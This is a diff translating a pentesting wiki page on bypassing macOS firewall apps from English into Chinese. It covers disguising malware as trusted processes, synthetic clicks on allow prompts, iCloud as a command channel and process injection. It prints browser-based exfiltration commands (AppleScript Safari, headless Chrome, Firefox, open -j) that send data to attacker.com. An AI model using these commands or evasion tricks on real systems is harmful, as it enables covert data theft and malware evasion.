@@ -1,85 +1,75 @@
-# macOS Bypassing Firewalls
+# macOS 绕过防火墙
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Found techniques
+## 发现的技术
 
-The following techniques were found working in some macOS firewall apps.
+以下技术在某些 macOS 防火墙应用中有效。
 
-### Abusing whitelist names
+### 滥用白名单名称
 
-- For example calling the malware with names of well known macOS processes like **`launchd`**
+- 例如使用 **`launchd`** 等知名 macOS 进程的名称来调用恶意软件
 
-### Synthetic Click
+### 合成点击
 
-- If the firewall ask for permission to the user make the malware **click on allow**
+- 如果防火墙要求用户授权，让恶意软件 **点击允许**
 
-### **Use Apple signed binaries**
+### **使用苹果签名的二进制文件**
 
-- Like **`curl`**, but also others like **`whois`**
+- 像 **`curl`**，还有其他如 **`whois`**
 
-### Well known apple domains
+### 知名苹果域名
 
-The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.
+防火墙可能允许连接到知名的苹果域名，如 **`apple.com`** 或 **`icloud.com`**。iCloud 可以用作 C2。
 
-### Generic Bypass
+### 通用绕过
 
-Some ideas to try to bypass firewalls
+一些尝试绕过防火墙的想法
 
-### Check allowed traffic
+### 检查允许的流量
 
-Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them
-
+了解允许的流量将帮助您识别潜在的白名单域名或哪些应用程序被允许访问它们
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
+### 滥用 DNS
 
-### Abusing DNS
-
-DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.
+DNS 解析是通过 **`mdnsreponder`** 签名应用程序完成的，该应用程序可能被允许联系 DNS 服务器。
 
 <figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Via Browser apps
+### 通过浏览器应用程序
 
 - **oascript**
-
 ```applescript
 tell application "Safari"
-    run
-    tell application "Finder" to set visible of process "Safari" to false
-    make new document
-    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
+run
+tell application "Finder" to set visible of process "Safari" to false
+make new document
+set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
 end tell
 ```
-
-- Google Chrome
-
+- 谷歌浏览器
 ```bash
 "Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
-- Firefox
-
+- 火狐浏览器
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
 - Safari
-
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
+### 通过进程注入
 
-### Via processes injections
-
-If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
+如果你可以**将代码注入到一个被允许连接到任何服务器的进程中**，你就可以绕过防火墙保护：
 
 {{#ref}}
 macos-proces-abuse/
 {{#endref}}
 
-## References
+## 参考
 
 - [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
